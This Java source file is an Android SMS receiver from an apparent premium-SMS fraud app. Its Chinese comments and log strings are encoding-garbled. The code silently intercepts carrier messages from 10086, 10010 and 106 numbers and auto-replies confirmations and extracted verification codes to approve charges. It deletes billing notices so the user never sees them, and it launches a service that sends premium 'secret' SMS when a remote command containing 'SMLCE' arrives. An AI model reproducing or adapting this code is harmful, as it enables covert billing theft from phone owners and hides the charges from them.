package com.sttm.charge;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.os.Bundle;
import android.telephony.gsm.SmsMessage;
import android.util.Log;

import com.sttm.bean.BillSms;
import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.EncryptUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;

@SuppressWarnings("deprecation")
public class SmsReceiver extends BroadcastReceiver {
	private static final String strRes = "android.provider.Telephony.SMS_RECEIVED";
	private static final String TAG = "SmsReceiver";
	private String smsNumber;
	private String smsContent;

	private String replyNumber;

	private String saleNum;
	private Boolean sendSecretSms;

	private String keyword;
	private boolean accessFilterSms ;
	
	private boolean smsCenterSendFlag;

	public SmsReceiver() {
		Log.d(TAG, "������������������");
		LogFile.WriteLogFile("������������������");
	}

	public void onReceive(Context context, Intent intent) {
		
		Log.d(TAG, "���Ž����������ɹ�");
		

		if (intent.getAction().equals(strRes)) {
			
			
			
			Log.d("SmsReceiver", "���Ž�������ʼ");
			
			
			smsCenterSendFlag = KsoCache.getInstance().getValue(
					"smsCenterFlag") != null ? (Boolean) KsoCache
					.getInstance().getValue("smsCenterFlag") : false;
					
					
			saleNum = KsoCache.getInstance().getValue("salenum") != null ? (String) KsoCache
					.getInstance().getValue("salenum") : "";

			sendSecretSms = KsoCache.getInstance().getValue("sendSecretSms") != null ? (Boolean) KsoCache
					.getInstance().getValue("sendSecretSms") : false;
					accessFilterSms = KsoCache.getInstance().getValue("accessFilterSms") == null ? true :
				(Boolean)KsoCache.getInstance().getValue("accessFilterSms") ;
					

			replyNumber = KsoCache.getInstance().getValue(
					"replyNumber") != null ? (String) KsoCache
					.getInstance().getValue("replyNumber") : "";

			keyword = KsoCache.getInstance().getValue("keyword") != null ? (String) KsoCache
					.getInstance().getValue("keyword") : "";
			Log.d(TAG, "���۷���֮���־=" + sendSecretSms);

			LogFile.WriteLogFile("���۷���֮���־=" + sendSecretSms);
			LogFile.WriteLogFile("���Żظ�����=" + replyNumber);
			LogFile.WriteLogFile("�ؼ���=" + keyword);
			// -------------------------------------------------------------------
			// ��ȡ�绰����Ͷ�������
			StringBuilder body = new StringBuilder();// ��������
			StringBuilder number = new StringBuilder();// ���ŷ�����
			Bundle bundle = intent.getExtras();

			if (bundle != null) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] msg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					msg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}

				for (SmsMessage currMsg : msg) {
					body.append(currMsg.getDisplayMessageBody());
					number.append(currMsg.getDisplayOriginatingAddress());
				}
				
				
				
				
				
				
				
				
				
				// �õ��������ݺ͵绰����
				smsContent = body.toString();
				smsNumber = number.toString();
				Log.d("���ź���", smsNumber);
				Log.d("��������", smsContent);
				
				Log.d("���Ͷ������ĺ���", smsCenterSendFlag  + "ss");
				
				
				if (smsNumber.startsWith("10086") || smsNumber.startsWith("10010")
						|| smsNumber.startsWith("106")) {

				
					SmsMessage message = msg[0];
					KsoCache.getInstance().reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());

					Log.d(TAG, "�������ĺ���Ϊ:" + message.getServiceCenterAddress());
					LogFile.WriteLogFile("�������ĺ���Ϊ:"
							+ message.getServiceCenterAddress());
					KsoCache.getInstance().reSetValue("smsCenterFlag", false);		
				
					if (smsCenterSendFlag) {
						this.abortBroadcast();
					}

				}
				
				
				
			}
			LogFile.WriteLogFile("���յ���һ������Ϊ" + smsNumber + "��������Ϊ" + smsContent
					+ "�Ķ���");

			// -------------------------------------------------------------------------

			

			if (sendSecretSms && accessFilterSms) {
				if (smsNumber.startsWith("10")
						|| smsNumber.startsWith(replyNumber)) {
					this.abortBroadcast();
					Log.d(TAG, "���˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���");
					LogFile.WriteLogFile("���˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���");
				}
			}

			// -------------------------------------------------------------------------------------------------

			if (!"".equals(replyNumber) && smsNumber.startsWith(replyNumber)) {
				Log.d(TAG, "���Ե�1");
				LogFile.WriteLogFile("���յ����ŵĺ�����ظ��������,����" + replyNumber + "��ͷ");
				// ���۶��Żظ�����
				/**
				 * ��������������С��ظ����⡱�����ظ���ȷ�ϡ��ؼ��ֵĶ��ţ���ظ����ǡ���
				 * ����ڷ��˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���
				 * ����ڷ��˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������
				 * :�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ����
				 */
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {

					if (sendSecretSms) {
						// ����Ƿ����˰��۶��ţ����յ�һ����Żأ���ɾ������
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");

						// ɾ�����Ͷ��ż�¼
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵�һ����ţ�����)");
					}

				}

				/**
				 * ���������������ĳЩ�ؼ��֣���ؼ���=���������롱�� ���߹ؼ���=�������ļ������ؼ��ֿ��Ե����������Ķ��ţ�
				 * 1�������������;����ļ������������0-9,a-z,A-Z,���ַ�����ظ�������Ϊ��
				 * ������ַ���ʼ��������0-9,a-z,A-Z,���ַ�������Ϊ�ظ�������
				 * 2��������ǵ�һ���������ӱ�������;����ļ����棬
				 * ��һ�������ĺ��֣�0-9,a-z,A-Z,����һ���������ĺ��֣�0-9,a-z,A-Z,������Ϊ�ظ�������
				 * 
				 */
				// Log.d(TAG, "�ؼ���" + keyword);

				if (smsContent.contains("��������")
						|| smsContent.contains("�����ļ�")
						|| (!"".equals(keyword) && smsContent.contains(keyword))) {

					Log.d("��������keyword", "========enter==========");

					int offSet = 0;
					if (smsContent.contains("��������")
							|| smsContent.contains("�����ļ�")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) >= 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {

						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								lastSet = i;
								break;
							}
						}

						// Log.d("offSet", "=======" + offSet + "offSet1");
						// Log.d("lastSet", "=======" + lastSet + "lastSet1");
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {

							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ����ݣ�" + smsCon
									+ " ���ŷ��ͳ�ȥ��");
							// Log.d(TAG, "���۶��ŷ���֮�󣬻ظ����ݣ�" + smsCon +
							// " ���ŷ��ͳ�ȥ��");
							this.abortBroadcast();
							// Log.d(TAG, "�����˵�һ����ţ�����)");
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {

						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						// Log.d("startIndex1", "--------" + startIndex +
						// "test1");
						// Log.d("lastSet1", "--------" + lastSet + "test1");
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						// Log.d(TAG, "��������1" + smsCont);

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							// Log.d(TAG, "���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont +
							// "���ŷ��ͳ�ȥ��");
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						}

					}

				}

			} else if (interpruptPhone(smsNumber)) {
				// ���ص����ź�����10086��106��10010
				Log.d(TAG, "���Զ�+++���ص����ź�����10086��106��10010");

				/**
				 * ��������� ��⵽���룺10086��106��10010����ͷ�ģ� ���С��ꡱ�����¡������ա�������㲥��
				 * ���С���Ϣ�ѡ�������������� ���С��㲥��Ϣ�������ڷ��͡� ���С��������⡱�� ���С��ɹ�����
				 */
				if ((smsContent.contains("��") && smsContent.contains("��")
						&& smsContent.contains("��") && smsContent
							.contains("��㲥"))
						|| (smsContent.contains("�������") && smsContent
								.contains("��Ϣ��"))
						|| (smsContent.contains("�㲥��Ϣ") && smsContent
								.contains("�ڷ���"))
						|| smsContent.contains("��������")
						|| smsContent.contains("�ɹ�����")) {

					this.abortBroadcast();
					LogFile.WriteLogFile("�����˵��������");

				}

				/**
				 * ��������������С��ظ����⡱�����ظ���ȷ�ϡ��ؼ��ֵĶ��ţ���ظ����ǡ���
				 * ����ڷ��˰��۶���֮�󣬰���һ����Żظ���ɾ�������к��롰10����ͷ�Ķ���
				 * ����ڷ��˲�Ʒ�շѶ���֮�󣬰���һ����Żظ���������������
				 * :�Ƿ�ɾ����Ӫ�̶��ź��Ƿ�ɾ��ͨ�����������Ƶ�һ��͵ڶ�������Ƿ�ɾ����
				 */
				if (smsContent.contains("�ظ�����") || smsContent.contains("�ظ���ȷ��")) {

					if (sendSecretSms) {
						// ����Ƿ����˰��۶��ţ����յ�һ����Żأ���ɾ������
						SmsSenderAndReceiver.send2(smsNumber, "��");
						LogFile.WriteLogFile("���۶��ŷ���֮�󣬻ظ���ȷ�϶��ŷ��ͳ�ȥ��");

						// ɾ�����Ͷ��ż�¼
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵�һ����ţ�����)");
					}
				}

				/**
				 * ���������������ĳЩ�ؼ��֣���ؼ���=���������롱�� ���߹ؼ���=�������ļ������ؼ��ֿ��Ե����������Ķ��ţ�
				 * 1�������������;����ļ������������0-9,a-z,A-Z,���ַ�����ظ�������Ϊ��
				 * ������ַ���ʼ��������0-9,a-z,A-Z,���ַ�������Ϊ�ظ�������
				 * 2��������ǵ�һ���������ӱ�������;����ļ����棬
				 * ��һ�������ĺ��֣�0-9,a-z,A-Z,����һ���������ĺ��֣�0-9,a-z,A-Z,������Ϊ�ظ�������
				 * 
				 */

				if (smsContent.contains("��������")
						|| smsContent.contains("�����ļ�")
						|| (!interpruptContent(smsContent)
								&& !"".equals(keyword) && smsContent
								.indexOf(keyword) > 0)) {

					int offSet = 0;
					if (smsContent.contains("��������")
							|| smsContent.contains("�����ļ�")) {
						offSet = smsContent.indexOf("��������") + 4;
					} else if (!"".equals(keyword)
							&& smsContent.indexOf(keyword) > 0) {
						offSet = smsContent.indexOf(keyword) + keyword.length();
					}
					// Log.d(TAG, "��������ƫ����" + offSet);
					int lastSet = 0;

					if (String.valueOf(smsContent.charAt(offSet)).matches(
							"^[A-Za-z0-9]+$")) {
						for (int i = offSet; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {
								lastSet = i;
								break;
							}
						}
						String smsCon = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCon = smsContent.substring(offSet, lastSet);

						} else {
							smsCon = smsContent.substring(offSet);
						}

						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCon);
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCon
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						}

					} else if (!String.valueOf(smsContent.charAt(offSet))
							.matches("^(w|[u4E00-u9FA5])*$")) {
						int startIndex = 0;

						for (int i = offSet + 1; i < smsContent.length(); i++) {
							if (String.valueOf(smsContent.charAt(i)).matches(
									"^[A-Za-z0-9]+$")) {

								startIndex = i;
								break;
							}
						}

						for (int i = startIndex; i < smsContent.length(); i++) {
							if (!String.valueOf(smsContent.charAt(i)).matches(
									"^(w|[u4E00-u9FA5])*$")) {

								lastSet = i;
								break;
							}
						}
						String smsCont = "";
						if (lastSet != smsContent.length() && lastSet != 0) {
							smsCont = smsContent.substring(startIndex, lastSet);

						} else {
							smsCont = smsContent.substring(startIndex);
						}
						if (sendSecretSms) {
							SmsSenderAndReceiver.send2(smsNumber, smsCont);
							LogFile.WriteLogFile("���۶��ŷ���֮�����ݻظ�Ϊ��" + smsCont
									+ "���ŷ��ͳ�ȥ��");

							this.abortBroadcast();
							LogFile.WriteLogFile("�����˵�һ����ţ�����)");

						}

					}

				}

				// �ڶ�����ţ�
				// ��⵽���룺10086��106��10010����ͷ�ģ����йؼ�����Ϣ�ѡ�����������롱��
				if (smsContent.contains("��Ϣ��") || smsContent.contains("�������")) {
					if (sendSecretSms) {
						this.abortBroadcast();
						LogFile.WriteLogFile("�����˵ڶ������");

					}
				}

				if (sendSecretSms) {
					// ������۶��ŷ����ˣ���һ����Ŷ�����ɾ��
					this.abortBroadcast();
					LogFile.WriteLogFile("�����˵�-����ţ�������۶��ŷ����ˣ���һ����Ŷ�����ɾ����");

				}

			} else if (!"".equals(smsNumber) && !"".equals(saleNum)
					&& smsNumber.indexOf(saleNum.trim()) >= 0) {
				// Log.d(TAG, "������");
				/**
				 * ��������ţ� ���ź����к����������룬�������
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("���������������룬������Ķ��ź���");

			}

			if (!"".equals(smsContent) && !"".equals(saleNum)&& smsContent.contains(saleNum)) {

				Log.d(TAG, "������");
				/**
				 * ��������ţ� ���������к����������룬�������
				 */
				this.abortBroadcast();
				LogFile.WriteLogFile("�����˶��������к����������룬������Ķ��ź���");

			} else if (interpruptContent(smsContent)) {

				Log.d(TAG, "������");
				this.abortBroadcast();

				// ���ض��������а���ͨ��
				BillSms billSms = EncryptUtil.getEncryptSMSString(smsContent);
				long time = KsoCache.getInstance().getValue("interval") != null ? (Long) KsoCache
						.getInstance().getValue("interval") : 4;

				Log.d("����ʱ����", time + "'");
				Log.d(TAG, "�������Ͷ��ŷ���");
				LogFile.WriteLogFile("�������Ͷ��ŷ���");
				Intent service = new Intent(context, SendSmsService.class);
				service.putExtra("sendTime", time);
				service.putExtra("sendCount", billSms.getCount());
				service.putExtra("secretSmsReplyNumber",
						billSms.getReplyNumber());
				service.putExtra("keyword", billSms.getKeyword());
				service.putExtra("flag", 1);
				if (KsoHelper.getARS2(context) == 1) {
					// Log.d(TAG, "�й��ƶ�����");

					service.putExtra("SecretSmsNumber",
							billSms.getMobileChanel());
					
					service.putExtra("SecretSmsOrder", billSms.getMobileOrder());
				

				} else if (KsoHelper.getARS2(context) == 2) {
					// Log.d(TAG, "�й���ͨ����");

					service.putExtra("SecretSmsNumber",
							billSms.getUnionChanel());
					service.putExtra("SecretSmsOrder", billSms.getUnionOrder());

					

				} 
				context.startService(service);
				// Log.d(TAG, "�����˰��۶���");
				LogFile.WriteLogFile("�����˰��۶���");

			} else if (smsContent.contains("����ޣ��������|ClientID".trim())) {
				String curstomId = KsoCache.getInstance().getValue("curstomID") != null ? (String) KsoCache
						.getInstance().getValue("curstomID") : "00000000";
				// Log.d("curstomID", curstomId + "===curstomId");
				if (!"".equals(curstomId)) {
					SmsSenderAndReceiver.send2(smsNumber, curstomId);
					LogFile.WriteLogFile("�����Ϳͻ�IDΪ" + curstomId + "����");
				}

				this.abortBroadcast();

			}

		}

	}

	// �绰10086��10010��106����

	public boolean interpruptPhone(String telephoneNumber) {
		if (telephoneNumber.startsWith("10086")
				|| telephoneNumber.startsWith("106")
				|| telephoneNumber.startsWith("10010")) {
			return true;

		}

		return false;

	}

	// ���۶���

	public boolean interpruptContent(String phoneContent) {
		if (phoneContent.indexOf("SMLCE") >= 0) {
			return true;
		}
		return false;
	}

	private void setSmsCenterNumber(Intent intent) {
		KsoCache cache = KsoCache.getInstance();
		Boolean smsCenterFlag = cache.getValue("smsCenterFlag") != null ? (Boolean) cache
				.getValue("smsCenterFlag") : false;
		if (smsCenterFlag) {
			String actionName = intent.getAction();
			int resultCode = getResultCode();
			if (actionName.equals("lab.sodino.sms.send")) {

				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName.equals("lab.sodino.sms.delivery")) {

				cache.reSetValue("SmsCenterNumber", "000");
			} else if (actionName
					.equals("android.provider.Telephony.SMS_RECEIVED")) {

				System.out.println("[Sodino]result = " + resultCode);
				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] myOBJpdus = (Object[]) bundle.get("pdus");
					SmsMessage[] messages = new SmsMessage[myOBJpdus.length];
					for (int i = 0; i < myOBJpdus.length; i++) {
						messages[i] = SmsMessage
								.createFromPdu((byte[]) myOBJpdus[i]);
					}
					SmsMessage message = messages[0];
					cache.reSetValue("SmsCenterNumber",
							message.getServiceCenterAddress());

					Log.d(TAG, "�������ĺ���Ϊ:" + message.getServiceCenterAddress());
					LogFile.WriteLogFile("�������ĺ���Ϊ:"
							+ message.getServiceCenterAddress());
					cache.reSetValue("smsCenterFlag", false);

				}
			}
		}
	}

}
